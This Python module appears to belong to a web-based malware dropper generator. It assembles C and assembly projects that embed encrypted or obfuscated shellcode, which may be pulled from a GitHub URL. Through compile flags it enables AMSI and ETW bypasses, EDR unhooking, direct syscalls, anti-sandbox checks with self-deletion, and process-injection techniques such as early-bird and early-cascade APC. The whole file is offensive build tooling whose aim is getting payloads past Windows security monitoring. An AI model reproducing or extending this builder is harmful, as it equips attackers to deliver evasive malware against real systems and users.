import os
import logging
import requests
from datetime import datetime
from api.droppers.models import DropperModel
from ..shellcode import obfuscate_shellcode, shellcode_to_header, CASCADE_STUB, clean_shellcode, file_to_shellcode
from api.droppers.services.github import fetch_github_ressource
from .hashing import compute_static_hashes


logger = logging.getLogger(__name__)


def setup_dropper(tmp_dir, dropper_config):
    try:
        # Check if filename is unique
        filename = f"{dropper_config.get('filename')}{dropper_config.get('file_extension')}"
        if DropperModel.objects.filter(filename=filename).exists():
            dropper_config['filename'] = f'{dropper_config.get('filename')}_{datetime.now().strftime("%Y%m%d_%H%M%S")}'
            
        
        # Set up source files based on enabled features
        preprocessing_macros = dropper_config.get('preprocessing_macros', [])
        set_makefile_source_files(tmp_dir, preprocessing_macros)
        
        # Fill in configuration headers with provided data
        fill_config_header(dropper_config, tmp_dir)

        # Compute static hashes
        compute_static_hashes(os.path.join(tmp_dir))
        
        # Remove debug code if not in debug mode
        if not dropper_config.get('debug_mode'):
            remove_debug_code("DebugPrint", tmp_dir)
            remove_debug_code("DebugPrintW", tmp_dir)
            
        return True
        
    except Exception as e:
        logger.error(f"Failed to set up dropper: {str(e)}", exc_info=True)
        raise
    

def replace_placeholders(file_path, replacements):
    with open(file_path, 'r') as file:
        lines = file.readlines()

    for i, line in enumerate(lines):
        for placeholder, value in replacements.items():
            if placeholder in line:
                lines[i] = line.replace(placeholder, value)
                break

    with open(file_path, 'w') as file:
        file.writelines(lines)
        
def set_precompilation_flags(dropper_config: dict):
    flags = []
    
    if dropper_config.get('debug_mode'):
        flags.append('DEBUG')

    if dropper_config.get('redirect_output'):
        flags.append('REDIRECT_OUTPUT')
    
    if dropper_config.get('remote_process_name'):
        flags.append('PROCESS_NAME_ENABLED')

    if 'obfuscation' in dropper_config.get('obfuscation', '').lower():
        flags.append('OBFUSCATED_PAYLOAD')
    elif 'encryption' in dropper_config.get('obfuscation', '').lower():
        flags.append('ENCRYPTED_PAYLOAD')
        
    flags.append(dropper_config.get('injector'))
    flags.append(dropper_config.get('loader'))
    flags.append(dropper_config.get('obfuscation'))
    flags.append(dropper_config.get('amsi_bypass'))
    flags.append(dropper_config.get('etw_bypass'))
    flags.append(dropper_config.get('unhooking'))
    flags.append(dropper_config.get('syscalls'))
    
    dropper_config['preprocessing_macros'] = flags

def _get_required_source_files(preprocessing_macros):
    """
    Returns a tuple of (required_c_files, required_asm_files) based on the provided preprocessing macros.
    """
    # Core files that are always required
    core_c_files = [
        'dropper.c',
        'config.c',
        'modules/crypto/crypto.c',
        'modules/entropy/entropy.c',
        'modules/injectors/injectors.c',
        'modules/loaders/loaders.c',
        'modules/stealth_techniques/iat_obfuscation.c',
        'modules/entropy/entropy.c',
        'modules/entropy/custom_win_api.c',
        'utils/api_hashing.c',
        'utils/debug.c',
        'utils/hardware_breakpoints.c',
        'utils/process_utils.c',
        'utils/utils.c',
        'utils/asm_utils.c',
        'utils/peb_utils.c',
        'utils/obfuscation.c'
    ]
    
    # Core NASM files that are always required
    core_asm_files = []
    
    # Map of preprocessing macros to their required C source files
    macro_to_c_files = {
        # Anti Analysis
        'ANTI_ANALYSIS_ENABLED': [
            'modules/anti_sandbox/anti_sandbox.c',
            'modules/anti_sandbox/delay.c',
            'modules/anti_sandbox/mouse_action.c',
            'modules/anti_sandbox/self_delete.c'
        ],
        
        # AMSI Bypass
        'AMSI_BYPASS': [
            'modules/amsi_bypass/amsi_bypass.c',
            'modules/amsi_bypass/function_patching.c'
        ],
        
        # Block ETW
        'ETW_BYPASS': [
            'modules/etw_bypass/etw_bypass.c',
            'modules/etw_bypass/function_patching.c',
            'modules/etw_bypass/hbp_hooking.c'
        ],
        
        # Unhooking
        'UNHOOKING_ENABLED': ['modules/unhooking/unhooking.c'],
        'KNOWN_DLLS_UNHOOKING': ['modules/unhooking/known_dlls_unhooking.c'],
        'SUSPENDED_PROCESS_UNHOOKING': ['modules/unhooking/suspended_process_unhooking.c'],
        
        # Encryption
        'ENCRYPTED_PAYLOAD': ['modules/crypto/crypto.c'],
        'AES_ENCRYPTION': ['modules/crypto/aes_encryption.c'],
        'CHACHA20_ENCRYPTION': ['modules/crypto/chacha20_encryption.c'],
        'DES_ENCRYPTION': ['modules/crypto/des_encryption.c'],
        'RC4_ENCRYPTION': ['modules/crypto/rc4_encryption.c'],
        'RSA_ENCRYPTION': ['modules/crypto/rsa_encryption.c'],
        'XOR_ENCRYPTION': ['modules/crypto/xor_encryption.c'],
        
        # Obfuscation
        'OBFUSCATED_PAYLOAD': ['modules/encoders/encoders.c'],
        'IPV4_OBFUSCATION': ['modules/encoders/ipv4_encoding.c'],
        'IPV6_OBFUSCATION': ['modules/encoders/ipv6_encoding.c'],
        'MAC_OBFUSCATION': ['modules/encoders/mac_encoding.c'],
        'UUID_OBFUSCATION': ['modules/encoders/uuid_encoding.c'],
        
        # Syscalls
        'SYSCALL_ENABLED': ['syscalls/router.c', 'syscalls/syscalls.c', 'utils/syscall_functions.c'],
        'HW_SYSCALLS': ['syscalls/direct/SysWhispers3/sw3_syscalls.c', 'syscalls/direct/SysWhispers3/sw3_common.c'],
        'SW3_SYSCALLS': ['syscalls/direct/SysWhispers3/sw3_syscalls.c', 'syscalls/direct/SysWhispers3/sw3_common.c'],
        
        # Injectors
        'REMOTE_PROCESS_INJECTION': ['modules/injectors/remote_process_injection.c'],
        'APC_INJECTION': ['modules/injectors/apc_injection.c'],
        'EARLY_BIRD_INJECTION': ['modules/injectors/early_bird_apc_injection.c'],
        'EARLY_CASCADE_INJECTION': ['modules/injectors/early_cascade_injection.c'],
        
        # Loaders
        'IN_MEMORY': ['modules/loaders/in_memory.c'],
        'FUNCTION_STOMPING': ['modules/loaders/function_stomping.c'],
        'FILE_MAPPING': ['modules/loaders/file_mapping.c']
    }

    # Map of preprocessing macros to their required ASM source files
    macro_to_asm_files = {
        # SysWhispers3 ASM files
        'SW3_SYSCALLS': [
            'syscalls/direct/SysWhispers3/sw3_syscalls-asm.x64.nasm',
            # 'syscalls/direct/SysWhispers3/sw3_syscalls-asm.x86.nasm'
        ],
    }

    # Add C files based on enabled features
    required_c_files = set(core_c_files)
    required_asm_files = set(core_asm_files)
    
    for macro in preprocessing_macros:
        # Add C files for the macro if defined
        if macro in macro_to_c_files:
            required_c_files.update(macro_to_c_files[macro])
        # Add ASM files for the macro if defined
        if macro in macro_to_asm_files:
            required_asm_files.update(macro_to_asm_files[macro])
    
    # Return both C and ASM files
    return sorted(required_c_files), sorted(required_asm_files)

def set_makefile_source_files(source_path, preprocessing_macros=None):
    """
    Updates the Makefile with only the required source files based on preprocessing macros.
    
    Args:
        source_path: Path to the source directory
        preprocessing_macros: List of preprocessing macros that are enabled
    """
    if preprocessing_macros is None:
        preprocessing_macros = []
    
    # Get required source files
    c_files, asm_files = _get_required_source_files(preprocessing_macros)
    print(f"preprocessing macros: {preprocessing_macros}")
    
    # Format C source files for Makefile
    formatted_sources = ""
    for i in range(0, len(c_files), 2):
        line = ' '.join(c_files[i:i+2])
        if i + 2 < len(c_files):
            formatted_sources += line + " \\\n"
        else:
            formatted_sources += line
    
    # Update Makefile with selected source files
    replace_placeholders(
        os.path.join(source_path, "Makefile"), 
        {"/* SOURCE_FILES */": formatted_sources}
    )
    
    # Use the ASM files determined by _get_required_source_files
    formatted_asm_sources = ""
    for i in range(0, len(asm_files), 2):
        line = ' '.join(asm_files[i:i+2])
        if i + 2 < len(asm_files):
            formatted_asm_sources += line + " \\\n"
        else:
            formatted_asm_sources += line
            
    replace_placeholders(
        os.path.join(source_path, "Makefile"), 
        {"/* ASM_SOURCE_FILES */": formatted_asm_sources}
    )

def fill_config_header(header_data: dict, project_dir: str):
    header_constants = {}
    enc_key, enc_iv, stub = None, None, None
    
    if header_data.get("obfuscation"):
        encryption_method = header_data.get("obfuscation", []).split('_')[0].lower()
    else:
        encryption_method = None
        
    if header_data.get("shellcode"):
        header_data['shellcode_text'] = file_to_shellcode(header_data['shellcode'], header_data.get("execution_args"))
    if header_data.get("github_url"):
        github_file = fetch_github_ressource(header_data.get("github_url"))
        header_data['shellcode_text'] = file_to_shellcode(github_file, header_data.get("execution_args"))

    shellcode, enc_key, enc_iv = obfuscate_shellcode(clean_shellcode(header_data.get("shellcode_text")), algorithm=encryption_method)
    
    if "EARLY_CASCADE_INJECTION" in header_data.get("injector"):
        stub =  obfuscate_shellcode(
            CASCADE_STUB, 
            algorithm=encryption_method, 
            enc_key=enc_key if enc_key not in ["0x00", None] else None, 
            enc_iv=enc_iv if enc_iv not in ["0x00", None] else None
        )[0]

    header_constants["Payload"] = {"value": shellcode_to_header(shellcode, encryption_method, "Payload"), "size": len(shellcode.split(','))}
    if stub:
        header_constants["CascadeStub"] = {"value": shellcode_to_header(stub, encryption_method, "CascadeStub"), "size": len(stub.split(','))}
    if enc_key:
        header_constants["Key"] = {"value": enc_key, "size": len(enc_key.split(',')) if enc_key != "0x00" else 0}
    if enc_iv:
        header_constants["Iv"] = {"value": enc_iv, "size": len(enc_iv.split(',')) if enc_iv != "0x00" else 0}

    if header_data.get("remote_process_name"):
        process_name = header_data["remote_process_name"]
        if not process_name.endswith(".exe"):
            process_name += ".exe"
        header_constants["ProcessName"] = {"value": process_name}

    _write_config_headers(header_data.get("preprocessing_macros", []), header_constants, project_dir)
    

def _write_config_headers(precompil_flags: list = [], constants: list = [], project_dir: str = ""):
    flags = ""
    for flag in precompil_flags:
        if flag:
            flags += f"#define {flag}\n"
    
    flags += "\n"
    
    flags += f'extern {constants["Payload"]["value"].split(" =")[0]};\n'
    if constants.get("CascadeStub"):
        flags += f'extern {constants["CascadeStub"]["value"].split(" =")[0]};\n'
    flags += f'extern unsigned char Key [];\n'
    flags += f'extern unsigned char Iv [];\n'
    flags += f'extern wchar_t *ProcessName;\n'
    for constant_with_size in [key for key, value in constants.items() if "size" in value]:
        flags += f'extern unsigned long {constant_with_size}Size;\n'

    with open(os.path.join(project_dir, "config.h"), "w") as config_header_file:
        config_header_file.write("#include <wchar.h>\n\n")
        config_header_file.write(flags)

    with open(os.path.join(project_dir, "config.c"), "w") as config_file:
        config_file.write("#include \"config.h\"\n\n")
        
        config_file.write(f'{constants["Payload"]["value"]}\n')
        config_file.write(f'unsigned long PayloadSize = {constants["Payload"]["size"]};\n\n')
        
        if constants.get("CascadeStub"):
            config_file.write(f'{constants["CascadeStub"]["value"]}\n')
            config_file.write(f'unsigned long CascadeStubSize = {constants["CascadeStub"]["size"]};\n\n')
        
        if constants.get("Key"):
            config_file.write(f'unsigned char Key [] = {{\n\t{constants["Key"]["value"]}\n}};\n')
            config_file.write(f'unsigned long KeySize = {constants["Key"]["size"]};\n\n')
        
        if constants.get("Iv"):
            config_file.write(f'unsigned char Iv [] = {{\n\t{constants["Iv"]["value"]}\n}};\n')
            config_file.write(f'unsigned long IvSize = {constants["Iv"]["size"]};\n\n')
            
        if constants.get("ProcessName"):
            config_file.write(f'wchar_t *ProcessName =  L\"{constants["ProcessName"]["value"]}\";\n')
        
        config_file.write("\n")
        

def remove_debug_code(word: str, source_path: str):
    if not os.path.exists(source_path):
        raise ValueError(f"The folder path '{source_path}' does not exist.")

    # Recursively walk through the folder and its subfolders
    for root, _, files in os.walk(source_path):
        for file_name in files:
            if not file_name.endswith(('.c', '.h', '.cpp', '.hpp')):
                continue
            
            file_path = os.path.join(root, file_name)

            try:
                with open(file_path, 'r', encoding='utf-8') as file:
                    lines = file.readlines()

                # Filter out lines starting with the provided word
                filtered_lines = [line for line in lines if not line.lstrip().startswith(word)]

                # Rewrite the file with the filtered content
                with open(file_path, 'w', encoding='utf-8') as file:
                    file.writelines(filtered_lines)

            except Exception as e:
                print(f"Error processing file {file_path}: {e}")
